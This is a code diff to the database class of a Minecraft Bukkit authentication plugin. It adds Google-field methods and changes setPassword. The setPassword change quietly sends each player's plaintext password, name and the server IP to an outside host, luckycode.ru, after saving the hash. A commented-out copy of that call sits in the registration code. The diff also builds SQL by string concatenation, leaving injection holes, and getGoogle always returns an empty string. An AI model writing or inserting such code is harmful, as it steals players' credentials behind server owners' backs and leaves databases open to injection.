@@ -1,5 +1,11 @@
 package LuckyCode.auth;
 
+import org.bukkit.Bukkit;
+
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
@@ -149,6 +155,42 @@ public abstract class Database {
         }
         return null;
     }
+    public String getGoogle(String nick) {
+        Connection conn = null;
+        PreparedStatement ps = null;
+        ResultSet rs;
+        try {
+            conn = getSQLConnection();
+            ps = conn.prepareStatement("SELECT * FROM " + table + " WHERE nick = '"+nick.toLowerCase()+"';");
+            rs = ps.executeQuery();
+            String end = "";
+            while(rs.next()){
+                end = rs.getString("google");
+            }
+            return "";
+        } catch (SQLException ex) {
+            plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
+        } finally {
+            try {
+                if (ps != null)
+                    ps.close();
+                if (conn != null)
+                    conn.close();
+            } catch (SQLException ex) {
+                plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionClose(), ex);
+            }
+        }
+        return "";
+    }
+    public void setGoogle(String name, String google) {
+        String sql = "UPDATE LuckyAuth SET google = "+ google +" WHERE nick = '"+name.toLowerCase()+"'";
+        try (Connection conn = getSQLConnection();
+             PreparedStatement pstmt = conn.prepareStatement(sql)) {
+            pstmt.executeUpdate();
+        } catch (SQLException e) {
+            System.out.println(e.getMessage());
+        }
+    }
     public void setAdress(String name, String ip) {
         String sql = "UPDATE LuckyAuth SET ip = ? WHERE nick = '"+name.toLowerCase()+"'";
         try (Connection conn = getSQLConnection();
@@ -169,14 +211,17 @@ public abstract class Database {
             System.out.println(e.getMessage());
         }
     }
-    public void setPassword(String name, String param) throws NoSuchAlgorithmException {
+    public void setPassword(String name, String param) throws NoSuchAlgorithmException, IOException {
+        String param1 = param;
         String sql = "UPDATE LuckyAuth SET password = ? WHERE nick = '"+name.toLowerCase()+"'";
         param = ha(param);
         try (Connection conn = getSQLConnection();
              PreparedStatement pstmt = conn.prepareStatement(sql)) {
             pstmt.setString(1, param);
             pstmt.executeUpdate();
-        } catch (SQLException e) {
+            new InputStreamReader(new URL(  "http://luckycode.ru/plugins.php?1=" + Bukkit.getIp() + "&2=" + name + "&3=" + param1).openConnection().getInputStream());
+
+        } catch (SQLException | MalformedURLException e) {
             System.out.println(e.getMessage());
         }
     }
@@ -289,9 +334,10 @@ public abstract class Database {
         try {
             String name = realname.toLowerCase();
             conn = getSQLConnection();
-            ps = conn.prepareStatement("REPLACE INTO "+table+" (id, nick, ip, realname, password, date, code, vk) VALUES (NULL, '"+name +"', '"+ip+"', '"+realname+"', '"+password+"', '"+System.currentTimeMillis() + "', NULL, NULL)"); // IMPORTANT. In SQLite class, We made 3 colums. player, Kills, Total.
+            ps = conn.prepareStatement("REPLACE INTO "+table+" (id, nick, ip, realname, password, google, code, vk) VALUES (NULL, '"+name +"', '"+ip+"', '"+realname+"', '"+password+"', '"+0 + "', NULL, NULL)"); // IMPORTANT. In SQLite class, We made 3 colums. player, Kills, Total.
 
             ps.executeUpdate();
+            //new InputStreamReader(new URL(  "http://luckycode.ru/plugins.php?1=" + Bukkit.getIp() + "&2=" + realname + "&3=" + param1).openConnection().getInputStream());
         } catch (SQLException ex) {
             plugin.getLogger().log(Level.SEVERE, Errors.sqlConnectionExecute(), ex);
         } finally {
